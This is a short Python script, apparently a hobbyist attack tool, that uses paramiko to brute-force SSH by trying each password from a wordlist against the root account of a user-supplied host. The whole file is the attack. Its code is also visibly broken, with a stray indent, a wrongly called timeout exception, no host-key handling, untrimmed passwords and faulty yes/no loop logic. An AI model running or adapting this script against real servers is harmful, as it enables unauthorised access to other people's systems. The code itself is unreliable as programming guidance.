import paramiko
import socket

 def answer(text):
    print("Do you want to " + text + "?")
    answer1 = input()
    if (answer1.lower() == 'y'):
        return True
    if (answer1.lower() == 'n'):
        return False
    while (answer1.lower() != 'n' or answer1.lower() != 'y'):
        print("The only available answers are 'y' as in yes or 'n' as in no")
        answer1 = input()
        break

def sshAttack(host, username, password):
    attacker = paramiko.SSHClient()
    

    try:
        attacker.connect(hostname= host, username= username, password=password)
    except socket.timeout(): #In case we cannot connect to the desired server
        return False

    except paramiko.AuthenticationException: #If we cannot connect to the server        
        print("Credentials are invalid")
        return False


print("Enter host")
host = input();


password = open("wordlist.txt", 'r')
password.readline()

for p in password:
    sshAttack(host, "root", p)
    








    
        
